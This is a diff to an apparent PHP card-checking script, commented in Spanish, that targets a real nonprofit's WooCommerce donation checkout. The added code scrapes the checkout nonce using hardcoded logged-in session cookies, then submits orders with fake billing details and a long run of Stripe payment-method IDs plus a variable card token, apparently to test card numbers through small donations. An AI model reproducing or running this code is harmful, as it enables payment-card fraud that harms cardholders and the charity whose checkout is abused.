@@ -1919,9 +1919,32 @@ $startTime = microtime(true); //TIEMPO DE INICIO
 $BinData = BinData($bin); //Extrae los datos del bin
 	
 
+$curl = curl_init();                                                                                                            
+curl_setopt_array($curl, [                                        
+  CURLOPT_URL => 'https://facesandvoicesofrecovery.org/checkout/',                                                                
+  CURLOPT_RETURNTRANSFER => true,                                 
+  CURLOPT_ENCODING => '',                                        
+  CURLOPT_MAXREDIRS => 10,                                       
+  CURLOPT_TIMEOUT => 30,                                  
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,                 
+  CURLOPT_CUSTOMREQUEST => 'GET',                               
+  CURLOPT_COOKIE => '__stripe_mid=013db8e1-2d46-4cd8-b889-9ef257b130fabf70b4; wordpress_logged_in_508923f30af7c37ea20c1d6887bb80bd=carlos.perez%7C1731729744%7Cp7KAvNle7Z1J9WwkLyQ4PTMeq1zNEmuc8436DoPO1Gc%7C358a3a02a21c66e436aeb6c84464c7c513b7cb769cf0952f36dd1cb596190913; wp_woocommerce_session_508923f30af7c37ea20c1d6887bb80bd=19092%7C%7C1730692790%7C%7C1730689190%7C%7C608d43665e3846a5b853e5cd4ee4b124; wfwaf-authcookie-084fa67f8cdb5120d8f1ead9606207d0=19092%7Cother%7Cread%7C2f469e668da268a670e95cc90a5bf21bd1fd738973dd3bca1607b42bbab60974; woocommerce_items_in_cart=1; woocommerce_cart_hash=c73fc674d47101bf3c9ebdaef484e9dc; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-03%2021%3A17%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-03%2021%3A17%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2Fcart%2F',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua-platform: "Android"',
+    'referer: https://facesandvoicesofrecovery.org/cart/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$patron = '/name="woocommerce-process-checkout-nonce" value="([a-zA-Z0-9]+)"/';
+preg_match($patron, $response, $coincidencias);
+$nonce = $coincidencias[1];
+curl_close($curl);
+	
 	
 $curl = curl_init();
-
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
   CURLOPT_RETURNTRANSFER => true,
@@ -1972,7 +1995,7 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'billing_email=Dausitherer%40cuvox.de&billing_first_name=Carlos&billing_last_name=Perez&billing_company=&billing_country=US&billing_address_1=6195+bollinger+rd&billing_address_2=&billing_city=New+york&billing_state=AZ&billing_postcode=10010&billing_phone=4179204022&fvr_wc_donation_in_honor_of=&order_comments=&payment_method=stripe&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=&wc-stripe-is-deferred-intent=1&wc-stripe-new-payment-method=true&woocommerce-process-checkout-nonce=e0438f4841&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&wc-stripe-payment-method=pm_1QGokyKp81anl5QIoejWJzTg&wc-stripe-payment-method=pm_1QGolYKp81anl5QIPdrl9pPa&wc-stripe-payment-method=pm_1QGomQKp81anl5QIbY06H1MV&wc-stripe-payment-method=pm_1QGon2Kp81anl5QIp2ntpHvd&wc-stripe-payment-method=pm_1QGonrKp81anl5QIWsFun65i&wc-stripe-payment-method=pm_1QGooNKp81anl5QINyE5PWhP&wc-stripe-payment-method=pm_1QGoowKp81anl5QI4tyRgXv3&wc-stripe-payment-method=pm_1QGopZKp81anl5QIUY1qIeoA&wc-stripe-payment-method=pm_1QGoqWKp81anl5QIVR20jaou&wc-stripe-payment-method=pm_1QGpQrKp81anl5QIgOoEj81c&wc-stripe-payment-method=pm_1QGpTsKp81anl5QIeEfuMM8Z&wc-stripe-payment-method=pm_1QGpXnKp81anl5QIHI5YAH3M&wc-stripe-payment-method=pm_1QGpYIKp81anl5QIaPDRlVJb&wc-stripe-payment-method=pm_1QGpYkKp81anl5QIu9oKZPP4&wc-stripe-payment-method=pm_1QGpZFKp81anl5QIuuxaiZno&wc-stripe-payment-method=pm_1QGpaAKp81anl5QIog9wH4dW&wc-stripe-payment-method=pm_1QGpb7Kp81anl5QIOFMpJvZh&wc-stripe-payment-method=pm_1QGpbpKp81anl5QIK27jXcVi&wc-stripe-payment-method=pm_1QGpdBKp81anl5QIoQRFFPKj&wc-stripe-payment-method=pm_1QGpekKp81anl5QIuG6iN6PO&wc-stripe-payment-method='.$id.'',
+  CURLOPT_POSTFIELDS => 'billing_email=Dausitherer%40cuvox.de&billing_first_name=Carlos&billing_last_name=Perez&billing_company=&billing_country=US&billing_address_1=6195+bollinger+rd&billing_address_2=&billing_city=New+york&billing_state=AZ&billing_postcode=10010&billing_phone=4179204022&fvr_wc_donation_in_honor_of=&order_comments=&payment_method=stripe&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=&wc-stripe-is-deferred-intent=1&wc-stripe-new-payment-method=true&woocommerce-process-checkout-nonce='.$nonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&wc-stripe-payment-method=pm_1QGokyKp81anl5QIoejWJzTg&wc-stripe-payment-method=pm_1QGolYKp81anl5QIPdrl9pPa&wc-stripe-payment-method=pm_1QGomQKp81anl5QIbY06H1MV&wc-stripe-payment-method=pm_1QGon2Kp81anl5QIp2ntpHvd&wc-stripe-payment-method=pm_1QGonrKp81anl5QIWsFun65i&wc-stripe-payment-method=pm_1QGooNKp81anl5QINyE5PWhP&wc-stripe-payment-method=pm_1QGoowKp81anl5QI4tyRgXv3&wc-stripe-payment-method=pm_1QGopZKp81anl5QIUY1qIeoA&wc-stripe-payment-method=pm_1QGoqWKp81anl5QIVR20jaou&wc-stripe-payment-method=pm_1QGpQrKp81anl5QIgOoEj81c&wc-stripe-payment-method=pm_1QGpTsKp81anl5QIeEfuMM8Z&wc-stripe-payment-method=pm_1QGpXnKp81anl5QIHI5YAH3M&wc-stripe-payment-method=pm_1QGpYIKp81anl5QIaPDRlVJb&wc-stripe-payment-method=pm_1QGpYkKp81anl5QIu9oKZPP4&wc-stripe-payment-method=pm_1QGpZFKp81anl5QIuuxaiZno&wc-stripe-payment-method=pm_1QGpaAKp81anl5QIog9wH4dW&wc-stripe-payment-method=pm_1QGpb7Kp81anl5QIOFMpJvZh&wc-stripe-payment-method=pm_1QGpbpKp81anl5QIK27jXcVi&wc-stripe-payment-method=pm_1QGpdBKp81anl5QIoQRFFPKj&wc-stripe-payment-method=pm_1QGpekKp81anl5QIuG6iN6PO&wc-stripe-payment-method='.$id.'',
   CURLOPT_COOKIE => '__stripe_mid=013db8e1-2d46-4cd8-b889-9ef257b130fabf70b4; wordpress_logged_in_508923f30af7c37ea20c1d6887bb80bd=carlos.perez%7C1731729744%7Cp7KAvNle7Z1J9WwkLyQ4PTMeq1zNEmuc8436DoPO1Gc%7C358a3a02a21c66e436aeb6c84464c7c513b7cb769cf0952f36dd1cb596190913; wp_woocommerce_session_508923f30af7c37ea20c1d6887bb80bd=19092%7C%7C1730692790%7C%7C1730689190%7C%7C608d43665e3846a5b853e5cd4ee4b124; wfwaf-authcookie-084fa67f8cdb5120d8f1ead9606207d0=19092%7Cother%7Cread%7C841c0e8b6d48f124aa48b5bffe4fded8cc62e817b21ef3c33a1d10a4ef268a16; woocommerce_items_in_cart=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-02%2021%3A16%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-02%2021%3A16%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; woocommerce_cart_hash=c73fc674d47101bf3c9ebdaef484e9dc',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
